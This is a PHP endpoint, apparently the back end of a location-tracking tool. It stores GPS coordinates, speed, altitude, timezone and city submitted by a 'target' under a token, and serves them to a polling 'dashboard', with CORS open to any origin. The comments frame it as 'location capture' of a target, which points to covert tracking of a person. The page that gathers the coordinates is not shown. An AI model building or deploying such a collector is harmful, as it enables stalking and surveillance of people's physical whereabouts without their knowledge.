<?php
// loc_receive.php — HTTP-based location capture (replaces unreliable PeerJS)
// POST: target submits location → saved to DB
// GET:  dashboard polls for new rows

require_once __DIR__ . '/db.php';
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

// Auto-create table on first run
try {
    getDB()->exec("CREATE TABLE IF NOT EXISTS loc_captures (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        token       VARCHAR(64)  NOT NULL,
        lat         DOUBLE       NOT NULL,
        lon         DOUBLE       NOT NULL,
        accuracy    DOUBLE       DEFAULT 0,
        altitude    DOUBLE       DEFAULT NULL,
        speed       DOUBLE       DEFAULT NULL,
        tz          VARCHAR(100) DEFAULT '',
        city        VARCHAR(100) DEFAULT '',
        country     VARCHAR(100) DEFAULT '',
        captured_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_token (token),
        INDEX idx_time  (captured_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
} catch (Exception $e) { /* already exists */ }

$method = $_SERVER['REQUEST_METHOD'];

// ── POST: target submits their location ───────────────────────────
if ($method === 'POST') {
    $token = trim($_POST['token'] ?? '');
    if (!$token || strlen($token) > 64) {
        echo json_encode(['error' => 'invalid token']); exit;
    }

    $lat      = (float)($_POST['lat']      ?? 0);
    $lon      = (float)($_POST['lon']      ?? 0);
    $accuracy = (float)($_POST['accuracy'] ?? 0);
    $altitude = (isset($_POST['altitude']) && $_POST['altitude'] !== '') ? (float)$_POST['altitude'] : null;
    $speed    = (isset($_POST['speed'])    && $_POST['speed']    !== '') ? (float)$_POST['speed']    : null;
    $tz       = substr(trim($_POST['tz']      ?? ''), 0, 100);
    $city     = substr(trim($_POST['city']    ?? ''), 0, 100);
    $country  = substr(trim($_POST['country'] ?? ''), 0, 100);

    getDB()->prepare(
        "INSERT INTO loc_captures (token, lat, lon, accuracy, altitude, speed, tz, city, country)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )->execute([$token, $lat, $lon, $accuracy, $altitude, $speed, $tz, $city, $country]);

    echo json_encode(['ok' => true]);

// ── GET: dashboard polls for new rows ────────────────────────────
} elseif ($method === 'GET') {
    $token = trim($_GET['token'] ?? '');
    if (!$token || strlen($token) > 64) {
        echo json_encode(['rows' => []]); exit;
    }

    $since = max(0, (int)($_GET['since'] ?? 0));

    $st = getDB()->prepare(
        "SELECT id, lat, lon, accuracy, altitude, speed, tz, city, country, captured_at
         FROM loc_captures WHERE token = ? AND id > ?
         ORDER BY id ASC LIMIT 50"
    );
    $st->execute([$token, $since]);

    echo json_encode(['rows' => $st->fetchAll(PDO::FETCH_ASSOC)]);

} else {
    http_response_code(405);
    echo json_encode(['error' => 'method not allowed']);
}
